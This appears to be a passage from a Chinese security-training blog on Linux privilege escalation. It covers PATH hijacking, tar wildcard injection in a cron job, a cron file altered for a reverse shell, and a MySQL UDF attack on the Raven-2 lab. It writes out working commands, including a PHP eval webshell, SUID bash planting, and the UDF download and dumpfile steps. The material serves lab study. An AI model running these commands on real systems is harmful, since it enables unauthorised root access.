href="#执行ps和执行bash-x2F-ps是一样的意思" class="headerlink" title="执行ps和执行bash&#x2F;ps是一样的意思"></a>执行ps和执行bash&#x2F;ps是一样的意思</h6><p><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230423172204592.png" alt="image-20230423172204592"></p><h6 id="gcc-demo-c-o-shell编译demo-c为shell，执行-x2F-shell，就相当于执行了ps命令"><a href="#gcc-demo-c-o-shell编译demo-c为shell，执行-x2F-shell，就相当于执行了ps命令" class="headerlink" title="gcc demo.c -o shell编译demo.c为shell，执行.&#x2F;shell，就相当于执行了ps命令"></a>gcc demo.c -o shell编译demo.c为shell，执行.&#x2F;shell，就相当于执行了ps命令</h6><p><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230423172520360.png" alt="image-20230423172520360"></p><h6 id="这里的逻辑是"><a href="#这里的逻辑是" class="headerlink" title="这里的逻辑是"></a>这里的逻辑是</h6><p><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230423172730578.png" alt="image-20230423172730578"></p><h6 id="在普通用户的权限下，执行cp-x2F-bin-x2F-bash-x2F-tmp-x2F-ps，将bash复制过来重命名问ps"><a href="#在普通用户的权限下，执行cp-x2F-bin-x2F-bash-x2F-tmp-x2F-ps，将bash复制过来重命名问ps" class="headerlink" title="在普通用户的权限下，执行cp &#x2F;bin&#x2F;bash &#x2F;tmp&#x2F;ps，将bash复制过来重命名问ps"></a>在普通用户的权限下，执行cp &#x2F;bin&#x2F;bash &#x2F;tmp&#x2F;ps，将bash复制过来重命名问ps</h6><p><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230423172821860.png" alt="image-20230423172821860"></p><h6 id="这时执行-x2F-ps和bash是同一个意思"><a href="#这时执行-x2F-ps和bash是同一个意思" class="headerlink" title="这时执行.&#x2F;ps和bash是同一个意思"></a>这时执行.&#x2F;ps和bash是同一个意思</h6><p><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230423173010552.png" alt="image-20230423173010552"></p><h6 id="但是这时，执行-x2F-shell还是相当于执行：ps，而不是-x2F-ps"><a href="#但是这时，执行-x2F-shell还是相当于执行：ps，而不是-x2F-ps" class="headerlink" title="但是这时，执行.&#x2F;shell还是相当于执行：ps，而不是.&#x2F;ps"></a>但是这时，执行.&#x2F;shell还是相当于执行：ps，而不是.&#x2F;ps</h6><p><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230423173131739.png" alt="image-20230423173131739"></p><h6 id="而之所以执行ps会直接调用是因为其在bash下，而bash是设置了环境变量的"><a href="#而之所以执行ps会直接调用是因为其在bash下，而bash是设置了环境变量的" class="headerlink" title="而之所以执行ps会直接调用是因为其在bash下，而bash是设置了环境变量的"></a>而之所以执行ps会直接调用是因为其在bash下，而bash是设置了环境变量的</h6><p><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230423173324456.png" alt="image-20230423173324456"></p><h6 id="所以将刚才的shell目录-x2F-tmp添加为环境变量"><a href="#所以将刚才的shell目录-x2F-tmp添加为环境变量" class="headerlink" title="所以将刚才的shell目录&#x2F;tmp添加为环境变量"></a>所以将刚才的shell目录&#x2F;tmp添加为环境变量</h6><p><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230423173428438.png" alt="image-20230423173428438"></p><p><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230423173602047.png" alt="image-20230423173602047"></p><h6 id="现在执行-x2F-shell，直接会变成root权限"><a href="#现在执行-x2F-shell，直接会变成root权限" class="headerlink" title="现在执行.&#x2F;shell，直接会变成root权限"></a>现在执行.&#x2F;shell，直接会变成root权限</h6><p><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230423173648404.png" alt="image-20230423173648404"></p><h6 id="原理如下，会优先执行-x2F-tmp-x2F-目录下的ps"><a href="#原理如下，会优先执行-x2F-tmp-x2F-目录下的ps" class="headerlink" title="原理如下，会优先执行&#x2F;tmp&#x2F;目录下的ps"></a>原理如下，会优先执行&#x2F;tmp&#x2F;目录下的ps</h6><p><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230423173833416.png" alt="image-20230423173833416"></p><h6 id="如何发现"><a href="#如何发现" class="headerlink" title="如何发现"></a>如何发现</h6><p><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230423180651200.png" alt="image-20230423180651200"></p><h3 id="Linux-定时任务打包配合SUID-本地"><a href="#Linux-定时任务打包配合SUID-本地" class="headerlink" title="#Linux-定时任务打包配合SUID-本地"></a>#Linux-定时任务打包配合SUID-本地</h3><h5 id="提权通过获取计划任务执行文件信息进行提权"><a href="#提权通过获取计划任务执行文件信息进行提权" class="headerlink" title="提权通过获取计划任务执行文件信息进行提权"></a>提权通过获取计划任务执行文件信息进行提权</h5><h5 id="1、相对路径和绝对路径执行"><a href="#1、相对路径和绝对路径执行" class="headerlink" title="1、相对路径和绝对路径执行"></a>1、相对路径和绝对路径执行</h5><h5 id="2、计划任务命令存在参数调用"><a href="#2、计划任务命令存在参数调用" class="headerlink" title="2、计划任务命令存在参数调用"></a>2、计划任务命令存在参数调用</h5><h5 id="利用计划任务的备份功能tar命令的参数利用"><a href="#利用计划任务的备份功能tar命令的参数利用" class="headerlink" title="利用计划任务的备份功能tar命令的参数利用"></a>利用计划任务的备份功能tar命令的参数利用</h5><p>–checkpoint[&#x3D;NUMBER] 显示每个Numbers记录的进度消息（默认值为10）</p><p>–checkpoint-action&#x3D;ACTION 在每个checkpoint（检查点）上执行ACTION</p><ol><li>echo “” &gt; “–checkpoint-action&#x3D;exec&#x3D;sh test.sh”（创建一个名为 <code>--checkpoint-action=exec=sh test.sh</code> 的空文件，exec&#x3D;sh的意思是执行当前sh文件）</li><li>echo “” &gt; –checkpoint&#x3D;1  <strong>（–checkpoint&#x3D;n：每写入n个记录之后设置一个检查点，在检查点可以执行任意的操作，操作由–checkpoint-action指定）</strong></li><li>echo ‘cp &#x2F;bin&#x2F;bash &#x2F;tmp&#x2F;bash; chmod +s &#x2F;tmp&#x2F;bash’ &gt; test.sh</li><li>chmod +x test.sh</li><li><code>之所以在tmp目录是因为其默认所有用户都有执行权限</code></li><li><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230424151102436.png" alt="image-20230424151102436"></li></ol><h6 id="1、比如定时打包一个文件夹里面的所有东西"><a href="#1、比如定时打包一个文件夹里面的所有东西" class="headerlink" title="1、比如定时打包一个文件夹里面的所有东西"></a>1、比如定时打包一个文件夹里面的所有东西</h6><p><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230423210907875.png" alt="image-20230423210907875"></p><h6 id="查看定时任务cat-etc-x2F-crontab"><a href="#查看定时任务cat-etc-x2F-crontab" class="headerlink" title="查看定时任务cat etc&#x2F;crontab"></a>查看定时任务cat etc&#x2F;crontab</h6><p><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230423211307097.png" alt="image-20230423211307097"></p><h6 id="打开tmp目录下的backup-sh文件，是打包的定时任务"><a href="#打开tmp目录下的backup-sh文件，是打包的定时任务" class="headerlink" title="打开tmp目录下的backup.sh文件，是打包的定时任务"></a>打开tmp目录下的backup.sh文件，是打包的定时任务</h6><p><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230423211432257.png" alt="image-20230423211432257"></p><h6 id="vim-etc-x2F-crontab-取消其前面的-号"><a href="#vim-etc-x2F-crontab-取消其前面的-号" class="headerlink" title="vim etc&#x2F;crontab,取消其前面的#号"></a>vim etc&#x2F;crontab,取消其前面的#号</h6><p><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230423211606949.png" alt="image-20230423211606949"></p><h6 id="等待一会，打包完成"><a href="#等待一会，打包完成" class="headerlink" title="等待一会，打包完成"></a>等待一会，打包完成</h6><p><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230423212116425.png" alt="image-20230423212116425"></p><h6 id="2、下面进行上面利用计划任务的备份功能tar命令的参数来操作，先创建上述的三个文件，再chmod-u-x-test-sh给test-sh赋予执行权限"><a href="#2、下面进行上面利用计划任务的备份功能tar命令的参数来操作，先创建上述的三个文件，再chmod-u-x-test-sh给test-sh赋予执行权限" class="headerlink" title="2、下面进行上面利用计划任务的备份功能tar命令的参数来操作，先创建上述的三个文件，再chmod u+x test.sh给test.sh赋予执行权限"></a>2、下面进行上面利用计划任务的备份功能tar命令的参数来操作，先创建上述的三个文件，再chmod u+x test.sh给test.sh赋予执行权限</h6><p><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230423220123472.png" alt="image-20230423220123472"></p><h6 id="继续把这个打包计时任务开启，其上面这个test-sh任务是关闭的"><a href="#继续把这个打包计时任务开启，其上面这个test-sh任务是关闭的" class="headerlink" title="继续把这个打包计时任务开启，其上面这个test.sh任务是关闭的"></a>继续把这个打包计时任务开启，其上面这个test.sh任务是关闭的</h6><p><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230423220616995.png" alt="image-20230423220616995"></p><h6 id="稍等一会，可以发现多了个压缩文件和bash文件"><a href="#稍等一会，可以发现多了个压缩文件和bash文件" class="headerlink" title="稍等一会，可以发现多了个压缩文件和bash文件"></a>稍等一会，可以发现多了个压缩文件和bash文件</h6><p><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230423220727752.png" alt="image-20230423220727752"></p><h6 id="执行bash，发现还是普通用户权限，bash本身不具有（suid）root权限，但是root赋予了bash只有在执行的时候才会有（suid）root权限"><a href="#执行bash，发现还是普通用户权限，bash本身不具有（suid）root权限，但是root赋予了bash只有在执行的时候才会有（suid）root权限" class="headerlink" title="执行bash，发现还是普通用户权限，bash本身不具有（suid）root权限，但是root赋予了bash只有在执行的时候才会有（suid）root权限"></a>执行bash，发现还是普通用户权限，bash本身不具有（suid）root权限，但是root赋予了bash只有在执行的时候才会有（suid）root权限</h6><p><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230423222551323.png" alt="image-20230423222551323"></p><h6 id="查看文档怎么利用，发现是要用-p参数"><a href="#查看文档怎么利用，发现是要用-p参数" class="headerlink" title="查看文档怎么利用，发现是要用-p参数"></a>查看文档怎么利用，发现是要用-p参数</h6><h6 id=""><a href="#" class="headerlink" title=""></a><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230423221031782.png" alt="image-20230423221031782"></h6><h6 id="执行后获得root权限"><a href="#执行后获得root权限" class="headerlink" title="执行后获得root权限"></a>执行后获得root权限</h6><p><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230423223329756.png" alt="image-20230423223329756"></p><h6 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h6><p><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230423233743681.png" alt="image-20230423233743681"></p><p><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230424001934165.png" alt="image-20230424001934165"></p><h3 id="Linux-定时任务文件权限配置不当-WEB-amp-本地"><a href="#Linux-定时任务文件权限配置不当-WEB-amp-本地" class="headerlink" title="#Linux-定时任务文件权限配置不当-WEB&amp;本地"></a>#Linux-定时任务文件权限配置不当-WEB&amp;本地</h3><h5 id="利用不安全的权限分配操作导致的定时文件覆盖"><a href="#利用不安全的权限分配操作导致的定时文件覆盖" class="headerlink" title="利用不安全的权限分配操作导致的定时文件覆盖"></a>利用不安全的权限分配操作导致的定时文件覆盖</h5><h5 id="chmod-777-775-等-所有者-组-其他成员说明，导致所有人都可以将这个计时任务编辑内容，进行利用"><a href="#chmod-777-775-等-所有者-组-其他成员说明，导致所有人都可以将这个计时任务编辑内容，进行利用" class="headerlink" title="chmod 777 775 等 所有者 组 其他成员说明，导致所有人都可以将这个计时任务编辑内容，进行利用"></a>chmod 777 775 等 所有者 组 其他成员说明，导致所有人都可以将这个计时任务编辑内容，进行利用</h5><h6 id="比如修改为反弹命令"><a href="#比如修改为反弹命令" class="headerlink" title="比如修改为反弹命令"></a>比如修改为反弹命令</h6><p><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230424002539787.png" alt="image-20230424002539787"></p><h6 id="监听端口收到会话"><a href="#监听端口收到会话" class="headerlink" title="监听端口收到会话"></a>监听端口收到会话</h6><h3 id="Linux-第三方软件MYSQL数据库提权-WEB-amp-本地"><a href="#Linux-第三方软件MYSQL数据库提权-WEB-amp-本地" class="headerlink" title="#Linux-第三方软件MYSQL数据库提权-WEB&amp;本地"></a>#Linux-第三方软件MYSQL数据库提权-WEB&amp;本地</h3><p>靶场下载：<a href="https://www.vulnhub.com/entry/raven-2,269/">https://www.vulnhub.com/entry/raven-2,269/</a></p><p>Vulnhub某靶机-探针IP及端口-利用漏洞获取web权限-信息收集-查看数据库配置文件-利用Mysql提权Linux（Mysql版本区别同Windows）</p><h3 id="探针IP及端口"><a href="#探针IP及端口" class="headerlink" title="#探针IP及端口"></a>#探针IP及端口</h3><p>nmap 192168.46.0&#x2F;24</p><h5 id="利用phpmailer漏洞进行修改并反弹"><a href="#利用phpmailer漏洞进行修改并反弹" class="headerlink" title="利用phpmailer漏洞进行修改并反弹"></a>利用phpmailer漏洞进行修改并反弹</h5><p>python D:&#x2F;Myproject&#x2F;40974.py</p><p>nc -lvvp 4444</p><h5 id="写入后门利用菜刀连接方便操作"><a href="#写入后门利用菜刀连接方便操作" class="headerlink" title="写入后门利用菜刀连接方便操作"></a>写入后门利用菜刀连接方便操作</h5><ul><li><p><code>echo &#39;&lt;?php eval($_POST[x]);?&gt;&#39; &gt;1.php</code></p></li><li><p>上传信息收集脚本进行提权信息收集</p></li><li><p>.&#x2F;LinEnum.sh</p></li><li><p>翻阅数据库配置文件获取root密码</p></li><li><p><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230424003146282.png" alt="image-20230424003146282"></p><h6 id="可以找到可利用的文件，但这里展示MYSQL的提权"><a href="#可以找到可利用的文件，但这里展示MYSQL的提权" class="headerlink" title="可以找到可利用的文件，但这里展示MYSQL的提权"></a>可以找到可利用的文件，但这里展示MYSQL的提权</h6><p><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230424003323789.png" alt="image-20230424003323789"></p><h6 id="这里找到mysql信息"><a href="#这里找到mysql信息" class="headerlink" title="这里找到mysql信息"></a>这里找到mysql信息</h6><p><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230424003501997.png" alt="image-20230424003501997"></p><h6 id="webshell找到配置文件获取MYSQL密码"><a href="#webshell找到配置文件获取MYSQL密码" class="headerlink" title="webshell找到配置文件获取MYSQL密码"></a>webshell找到配置文件获取MYSQL密码</h6><p><img src="/../images/Day104-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E7%B3%BB%E7%BB%9F-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1-%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93-MDUT%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230424003534698.png" alt="image-20230424003534698"></p><h6 id="下面用两种方法提权"><a href="#下面用两种方法提权" class="headerlink" title="下面用两种方法提权"></a>下面用两种方法提权</h6></li></ul><h5 id="1、利用Mysql提权-searchsploit（这种手工提权在前面我已经复现过了）"><a href="#1、利用Mysql提权-searchsploit（这种手工提权在前面我已经复现过了）" class="headerlink" title="1、利用Mysql提权 searchsploit（这种手工提权在前面我已经复现过了）"></a>1、利用Mysql提权 searchsploit（这种手工提权在前面我已经复现过了）</h5><p>1、下载mysql udf kali poc进行编译</p><ul><li>wget <a href="https://www.exploit-db.com/download/1518">https://www.exploit-db.com/download/1518</a></li><li>mv 1518 raptor_udf.c</li><li>gcc -g -c raptor_udf.c</li><li>gcc -g -shared -o raptor_udf.so raptor_udf.o -lc</li><li>mv raptor_udf.so 1518.so</li></ul><p>2、上传或下载1518到目标服务器</p><ul><li>wget <a href="https://xx.xx.xx.xx/1518.so">https://xx.xx.xx.xx/1518.so</a></li><li>进入数据库进行UDF导出</li><li>use mysql;</li><li>create table foo(line blob);</li><li>insert into foo values(load_file(‘&#x2F;tmp&#x2F;1518.so’));</li><li>select * from foo into dumpfile ‘&#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;plugin&#x2F;1518.so’;</li></ul><p>3、创建do_system函数调用</p><ul><li>create function do_system returns integer soname ‘1518.so’;</li><li>select do_system(‘chmod u+s &#x2F;usr&#x2F;bin&#x2F;find’);</li></ul><p>4、配合使用find调用执行</p><ul><li>touch xiaodi</li><li>find xiaodi –exec “whoami” ;</li><li>find xiaodi –exec “&#x2F;bin&#x2F;sh” ;</li><li>id</li></ul><h5 id="2、无法外联走隧道-MDUT自动化数据库提权"><a href="#2、无法外联走隧道-MDUT自动化数据库提权" class="headerlink" title="2、无法外联走隧道-MDUT自动化数据库提权"></a>2、无法外联走隧道-MDUT自动化数据库提权</h5><blockquote><p>开启外连：GRANT ALL PRIVILEGES ON <em>.</em> TO ‘root‘@’%’ IDENTIFIED BY ‘R@v3nSecurity’ WITH GRANT OPTION;</p><p>flush privileges;（刷新）</p></blockquote><ol><li>MDUT 2.0 数据库利用工具  <a href="https://github.com/SafeGroceryStore/MDUT">https://github.com/SafeGroceryStore/MDUT</a>  MDUT</li><li>综合高危漏洞利用工具(包含各大数据库)  <a href="https://github.com/Liqunkit/LiqunKit">https://github.com/Liqunkit/LiqunKit</a>_  LiqunKit</li><li>sqlserver利用工具  <a href="https://github.com/uknowsec/SharpSQLTools">https://github.com/uknowsec/SharpSQLTools</a>  SharpSQLTools</li><li>通过套接字重用通过受损的 Microsoft SQL Server 在受限环境中执行横向移动  <a href="https://github.com/blackarrowsec/mssqlproxy">https://github.com/blackarrowsec/mssqlproxy</a>  mssqlproxy</li><li>ODAT：Oracle 数据库攻击工具  <a href="https://github.com/quentinhardy/odat">https://github.com/quentinhardy/odat</a>  ODAT</li></ol><h6 id="由于手工linux的mysql提权较麻烦，所以用到这款工具，填写信息连接成功即可"><a href="#由于手工linux的mysql提权较麻烦，所以用到这款工具，填写信息连接成功即可" class="headerlink" title="由于手工linux的mysql提权较麻烦，所以用到这款工具，填写信息连接成功即可"></a>由于手工linux的mysql提权较麻烦，所以用到这款工具，填写信息连接成功即可</h6><p><img 